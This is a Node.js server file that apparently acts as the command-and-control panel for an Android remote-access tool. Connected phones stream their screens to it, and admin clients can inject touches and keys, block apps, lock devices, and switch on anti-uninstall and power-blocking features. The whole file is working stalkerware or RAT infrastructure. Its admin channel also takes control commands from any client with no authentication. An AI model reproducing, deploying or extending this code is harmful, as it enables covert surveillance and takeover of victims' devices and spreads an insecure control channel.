const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
    if (req.url === '/') {
        fs.readFile(path.join(__dirname, 'admin.html'), (err, data) => {
            if (err) {
                res.writeHead(500);
                res.end('Server Error');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
    } else if (req.url === '/api/devices') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(getDeviceList()));
    } else {
        res.writeHead(404);
        res.end('Not Found');
    }
});

const wss = new WebSocket.Server({ server });

let admins = new Set();
let devices = new Map(); // ws -> deviceInfo
let adminSessions = new Map(); // adminWs -> deviceWs
let blockedApps = new Map(); // deviceId -> [appPackageNames]

wss.on('connection', (ws, req) => {
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });
    
    let buffer = '';
    let deviceInfo = null;
    
    ws.on('message', (data) => {
        try {
            // Text message
            if (typeof data === 'string') {
                buffer += data;
                
                if (buffer.includes('\n')) {
                    const lines = buffer.split('\n');
                    buffer = lines.pop();
                    
                    for (const line of lines) {
                        const msg = line.trim();
                        if (!msg) continue;
                        
                        // Device registration
                        if (msg.startsWith('DEVICE:')) {
                            const parts = msg.substring(7).split('|');
                            deviceInfo = {
                                id: parts[0],
                                name: '📱 ' + parts[0],
                                androidVersion: parts[1] || 'Unknown',
                                model: parts[2] || 'Unknown',
                                apiLevel: parts[3] || 'Unknown',
                                ip: req.socket.remoteAddress,
                                connectedAt: Date.now()
                            };
                            devices.set(ws, deviceInfo);
                            console.log('✅ Device:', deviceInfo.id, deviceInfo.model);
                            ws.send('OK:REGISTERED\n');
                            broadcastToAdmins({ type: 'device_list', devices: getDeviceList() });
                        }
                        // Admin registration
                        else if (msg.startsWith('ADMIN:')) {
                            admins.add(ws);
                            ws.send(JSON.stringify({ type: 'device_list', devices: getDeviceList() }));
                            ws.send(JSON.stringify({ type: 'blocked_apps', apps: Object.fromEntries(blockedApps) }));
                        }
                        // App list from device
                        else if (msg.startsWith('APPS:')) {
                            const appsJson = msg.substring(5);
                            try {
                                const apps = JSON.parse(appsJson);
                                if (deviceInfo) {
                                    deviceInfo.apps = apps;
                                    broadcastToAdmins({ type: 'device_apps', deviceId: deviceInfo.id, apps: apps });
                                }
                            } catch(e) {}
                        }
                        else if (msg === 'PONG') {}
                    }
                }
            }
            // Binary data (screen image)
            else {
                const buffer = Buffer.isBuffer(data) ? data : Buffer.from(data);
                
                if (devices.has(ws)) {
                    // Forward to admin watching this device
                    for (const [adminWs, deviceWs] of adminSessions.entries()) {
                        if (deviceWs === ws && adminWs.readyState === WebSocket.OPEN) {
                            adminWs.send(buffer);
                            break;
                        }
                    }
                }
            }
        } catch(e) { console.error('Error:', e.message); }
    });
    
    ws.on('close', () => {
        admins.delete(ws);
        
        if (devices.has(ws)) {
            const info = devices.get(ws);
            console.log('❌ Device disconnected:', info.id);
            devices.delete(ws);
            
            for (const [adminWs, deviceWs] of adminSessions.entries()) {
                if (deviceWs === ws) {
                    adminSessions.delete(adminWs);
                    if (adminWs.readyState === WebSocket.OPEN) {
                        adminWs.send(JSON.stringify({ type: 'disconnected', deviceId: info.id }));
                    }
                }
            }
            broadcastToAdmins({ type: 'device_list', devices: getDeviceList() });
        }
    });
});

// Handle admin commands
wss.on('connection', (ws) => {
    // Override message handler for JSON commands
    const origHandler = ws._events?.message;
    ws.on('message', (data) => {
        if (typeof data === 'string' && data.startsWith('{')) {
            try {
                const cmd = JSON.parse(data);
                handleAdminCommand(ws, cmd);
            } catch(e) {}
        }
    });
});

function handleAdminCommand(adminWs, cmd) {
    switch(cmd.type) {
        case 'select_device':
            const deviceWs = findDeviceWs(cmd.deviceId);
            if (deviceWs) {
                adminSessions.set(adminWs, deviceWs);
                adminWs.send(JSON.stringify({ type: 'device_selected', deviceId: cmd.deviceId }));
                // Send device info
                const info = devices.get(deviceWs);
                if (info) {
                    adminWs.send(JSON.stringify({ type: 'device_info', info: info }));
                }
            }
            break;
            
        case 'touch':
            forwardToDevice(cmd.deviceId, `TOUCH:${cmd.action},${cmd.x},${cmd.y}\n`, adminWs);
            break;
            
        case 'key':
            forwardToDevice(cmd.deviceId, `KEY:${cmd.keyCode}\n`, adminWs);
            break;
            
        case 'block_app':
            // Send block command to device
            forwardToDevice(cmd.deviceId, `BLOCK:${cmd.package}\n`, adminWs);
            // Track blocked apps
            if (!blockedApps.has(cmd.deviceId)) blockedApps.set(cmd.deviceId, []);
            const list = blockedApps.get(cmd.deviceId);
            if (cmd.block && !list.includes(cmd.package)) list.push(cmd.package);
            else if (!cmd.block) blockedApps.set(cmd.deviceId, list.filter(p => p !== cmd.package));
            broadcastToAdmins({ type: 'blocked_apps', apps: Object.fromEntries(blockedApps) });
            break;
            
        case 'get_apps':
            forwardToDevice(cmd.deviceId, `GET_APPS\n`, adminWs);
            break;
            
        case 'lock_device':
            forwardToDevice(cmd.deviceId, `LOCK\n`, adminWs);
            break;
            
        case 'anti_uninstall':
            forwardToDevice(cmd.deviceId, `ANTI_UNINSTALL:${cmd.enable ? 1 : 0}\n`, adminWs);
            break;
            
        case 'power_block':
            forwardToDevice(cmd.deviceId, `POWER_BLOCK:${cmd.enable ? 1 : 0}\n`, adminWs);
            break;
    }
}

function forwardToDevice(deviceId, msg, adminWs) {
    const deviceWs = findDeviceWs(deviceId);
    if (deviceWs && deviceWs.readyState === WebSocket.OPEN) {
        deviceWs.send(msg);
        adminSessions.set(adminWs, deviceWs);
    }
}

function findDeviceWs(deviceId) {
    for (const [ws, info] of devices.entries()) {
        if (info.id === deviceId) return ws;
    }
    return null;
}

function getDeviceList() {
    const list = [];
    for (const [ws, info] of devices.entries()) {
        list.push({
            id: info.id,
            name: info.name,
            androidVersion: info.androidVersion,
            model: info.model,
            apiLevel: info.apiLevel,
            ip: info.ip,
            appsCount: info.apps ? info.apps.length : 0,
            connectedAt: info.connectedAt
        });
    }
    return list;
}

function broadcastToAdmins(msg) {
    const json = JSON.stringify(msg);
    for (const client of admins) {
        if (client.readyState === WebSocket.OPEN) {
            client.send(json);
        }
    }
}

// Keep alive
setInterval(() => {
    wss.clients.forEach(ws => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

server.listen(PORT, '0.0.0.0', () => {
    console.log('┌─────────────────────────────────────┐');
    console.log('│     OXIG GARA CONTROL CENTER       │');
    console.log('│     Dev By Oxig Gara                │');
    console.log('├─────────────────────────────────────┤');
    console.log(`│  Server: http://0.0.0.0:${PORT}              │`);
    console.log(`│  Admin:  http://localhost:${PORT}            │`);
    console.log('└─────────────────────────────────────┘');
});
